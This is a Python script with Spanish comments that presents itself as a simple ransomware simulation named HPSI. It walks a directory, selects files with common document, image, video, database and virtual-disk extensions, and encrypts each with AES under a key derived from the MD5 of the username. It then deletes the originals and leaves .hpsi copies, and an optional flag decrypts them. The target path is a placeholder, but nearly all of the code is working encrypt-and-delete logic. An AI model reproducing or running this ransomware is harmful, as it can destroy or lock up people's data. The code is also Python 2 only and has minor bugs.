"""
Ransomware HPSI
v.1.0
simple script en python simulando
un ransomware
- obtener todos los directorios
- obtener lista de todos los archivos cifrables
- cifrar con una clave asignada a una variable
"""

from md5 import *
import argparse
import sys
import os
import struct
import fnmatch
from Crypto.Cipher import AES
import random


sistema = os.name
if sistema == 'nt':
    ruta = "C:" + os.environ['HOMEPATH']
    usuario = ruta.split('\\')[-1]
elif sistema == 'posix':
    ruta = os.environ['HOME']
    usuario = ruta.split('/')[-1]
else:
    raise Error


def clave():
    clave = md5(usuario).hexdigest()
    return clave


clave = clave()
print '\nLa clave generada es: %s' % clave

lista = []
walk = os.walk

ruta = 'YOUR PATH HERE'

for raiz, subdirectorios, archivos in walk(ruta):
    for archivos in fnmatch.filter(archivos, '*'):
        lista.append(os.path.join(raiz, archivos))

listaCifrable = []
listaPermitidos = ['.doc', '.docx', '.lay6', '.sqlite3', '.sqlitedb', '.pdf',
                   '.accdb', '.java', '.class', '.mpeg', '.djvu', '.tiff',
                   '.backup', '.vmdk', '.sldm', '.sldx', '.potm', '.potx',
                   '.ppam', '.ppsx', '.ppsm', '.pptm', '.xltm', '.xltx',
                   '.xlsb', '.xlsm', '.dotx', '.dotm', '.docm', '.docb', '.mp4',
                   '.jpeg', '.onetoc2', '.vsdx', '.pptx', '.xlsx', '.docx',
                   '.dot', '.wbk', '.xls', '.xlt', '.xlm', '.ppt', '.pps',
                                   '.pot', '.pps', '.pdf', '.odt', '.ods', '.odp', '.odg',
                                   '.sxw', '.rtf', '.tmp', '.xar', '.asd', '.mp3', '.jpg', '.png']

for archivosEnLista in lista:
    if os.path.splitext(archivosEnLista)[1] in listaPermitidos:
        listaCifrable.append(archivosEnLista)
    else:
        pass
print '\nTotal de Archivos cifrados: %d\n' % len(listaCifrable)


def cifrarArchivo(key, in_filename, chunksize=64 * 1024):

    out_filename = in_filename + '.hpsi'
    Fsize = str(os.path.getsize(in_filename)).zfill(16)
    IniVect = ''

    for i in range(16):
        IniVect += chr(random.randint(0, 0xFF))

    encryptor = AES.new(key, AES.MODE_CBC, IniVect)

    with open(in_filename, "rb") as infile:
        with open(out_filename, "wb") as outfile:
            outfile.write(Fsize)
            outfile.write(IniVect)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))


def descifrarArchivo(key, in_filename, chunksize=64 * 1024):
    out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, "rb") as infile:
        fileS = infile.read(16)
        IniVect = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IniVect)

        with open(out_filename, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(int(fileS))


if len(sys.argv) == 1:
    # Comienza el cifrado
    for archivo_cifrar in listaCifrable:
        if(os.path.isfile(archivo_cifrar)):
            print('Encrypting> ' + archivo_cifrar)
            cifrarArchivo(clave, archivo_cifrar)
            os.remove(archivo_cifrar)
        else:
            print "Error"

parser = argparse.ArgumentParser()
parser.add_argument('-d', '--descifrar',
                    help="Descifrar archivos", action='store_true')
args = parser.parse_args()

if args.descifrar:
    # Comienza el Descifrado
    for archivo_descrifrar in lista:
        if(os.path.isfile(archivo_descrifrar)):
            fname, ext = os.path.splitext(archivo_descrifrar)
            if (ext == '.hpsi'):
                print('Decrypting> ' + archivo_descrifrar)
                descifrarArchivo(clave, archivo_descrifrar)
                os.remove(archivo_descrifrar)
